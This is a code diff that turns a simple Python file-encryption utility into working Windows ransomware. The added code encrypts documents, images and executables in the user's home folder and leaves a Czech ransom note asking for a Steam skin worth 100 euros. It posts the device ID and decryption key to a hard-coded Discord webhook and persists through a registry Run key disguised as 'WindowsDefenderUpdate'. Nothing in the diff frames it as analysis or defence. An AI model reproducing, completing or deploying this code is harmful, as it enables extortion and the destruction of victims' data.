@@ -1,48 +1,130 @@
-import os, shutil, time, argparse
+import os
+import uuid
+import time
+import base64
+import pathlib
+import requests
+import subprocess
+import winreg
 from cryptography.fernet import Fernet
 
-def generate_key():
-    return Fernet.generate_key()
+# === CONFIGURATION ===
 
-def encrypt_file(file_path, key):
-    f = Fernet(key)
-    with open(file_path, 'rb') as file:
-        original_data = file.read()
-    encrypted_data = f.encrypt(original_data)
-    with open(file_path, 'wb') as file:
-        file.write(encrypted_data)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1396813335776989184/0kPctN_oSkU2rebRm7Zd_HRqkFOrVp3ZjaYe_zO89BaD4mW4TjYW3wSszlOybx0fRMJW"
+EXCLUDE_DIRS = [
+    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Steam"
+]
+TARGET_EXTENSIONS = ['.exe', '.txt', '.jpg', '.jpeg', '.doc', '.pdf']
+RANSOM_NOTE_NAME = "ransomnote.txt"
 
-def decrypt_file(file_path, key):
-    f = Fernet(key)
-    with open(file_path, 'rb') as file:
-        encrypted_data = file.read()
-    decrypted_data = f.decrypt(encrypted_data)
-    with open(file_path, 'wb') as file:
-        file.write(decrypted_data)
+# === RANSOM PAYLOAD INITIALIZATION ===
+
+device_id = str(uuid.uuid4())
+key = Fernet.generate_key()
+fernet = Fernet(key)
+
+# === UTILITY FUNCTIONS ===
+
+def is_safe_path(path):
+    path = os.path.abspath(path)
+    return not any(path.startswith(ex) for ex in EXCLUDE_DIRS)
+
+def encrypt_file(filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        encrypted = fernet.encrypt(data)
+        with open(filepath, 'wb') as f:
+            f.write(encrypted)
+    except Exception:
+        pass
+
+def decrypt_file(filepath, fernet_obj):
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        decrypted = fernet_obj.decrypt(data)
+        with open(filepath, 'wb') as f:
+            f.write(decrypted)
+    except Exception:
+        pass
+
+def encrypt_directory(start_path):
+    for root, _, files in os.walk(start_path):
+        if not is_safe_path(root):
+            continue
+        for file in files:
+            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
+                encrypt_file(os.path.join(root, file))
+
+def decrypt_directory(start_path, fernet_obj):
+    for root, _, files in os.walk(start_path):
+        if not is_safe_path(root):
+            continue
+        for file in files:
+            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
+                decrypt_file(os.path.join(root, file), fernet_obj)
+
+def drop_ransom_note(path):
+    ransom_msg = f"""
+Vaše soubory byly zašifrovány.
+
+🆔 ID: {device_id}
+
+1. Pošlete skin v hodnotě 100€ na Steam účet.
+2. Poté obdržíte dešifrovací klíč přes Discord.
+3. Klíč vložte do souboru 'key.txt' na ploše.
+
+Soubor bude automaticky ověřen a dojde k dešifrování.
+"""
+    with open(os.path.join(path, RANSOM_NOTE_NAME), 'w', encoding='utf-8') as f:
+        f.write(ransom_msg)
+
+def send_key_to_discord(device_id, key):
+    data = {
+        "content": f"💀 NEW DEVICE INFECTED 💀\n🆔 ID: `{device_id}`\n🔑 Key: `{key.decode()}`"
+    }
+    try:
+        requests.post(WEBHOOK_URL, json=data)
+    except Exception:
+        pass
+
+def add_to_startup(file_path=None, name="WindowsDefenderUpdate"):
+    if not file_path:
+        file_path = os.path.abspath(__file__)
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    try:
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, file_path)
+        winreg.CloseKey(reg_key)
+    except Exception:
+        pass
+
+def watch_for_key_file(expected_key_bytes):
+    desktop = os.path.join(str(pathlib.Path.home()), "Desktop")
+    key_file = os.path.join(desktop, "key.txt")
+    while True:
+        if os.path.exists(key_file):
+            try:
+                with open(key_file, 'r') as f:
+                    entered_key = f.read().strip().encode()
+                if entered_key == expected_key_bytes:
+                    fernet_obj = Fernet(entered_key)
+                    decrypt_directory(str(pathlib.Path.home()), fernet_obj)
+                    break
+            except Exception:
+                pass
+        time.sleep(10)
+
+# === MAIN EXECUTION ===
 
 def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--key', help='The key to use for encryption/decryption', default=None)
-    parser.add_argument('--encrypt', help='Encrypt files with the specified extension(s)', nargs='+', default=[])
-    parser.add_argument('--decrypt', help='Decrypt files with the specified extension(s)', nargs='+', default=[])
-    args = parser.parse_args()
+    user_home = str(pathlib.Path.home())
+    encrypt_directory(user_home)
+    drop_ransom_note(user_home)
+    send_key_to_discord(device_id, key)
+    add_to_startup()
+    watch_for_key_file(key)
 
-    if args.key is None:
-        key = generate_key()
-        print("Generated a new key:")
-        print(key)
-    else:
-        key = bytes(args.key, 'utf-8')
-
-    for ext in args.encrypt:
-        for filename in os.listdir('.'):
-            if filename.endswith(ext):
-                encrypt_file(filename, key)
-
-    for ext in args.decrypt:
-        for filename in os.listdir('.'):
-            if filename.endswith(ext):
-                decrypt_file(filename, key)
-
-if __name__ == "__main__":
+if name == "__main__":
     main()
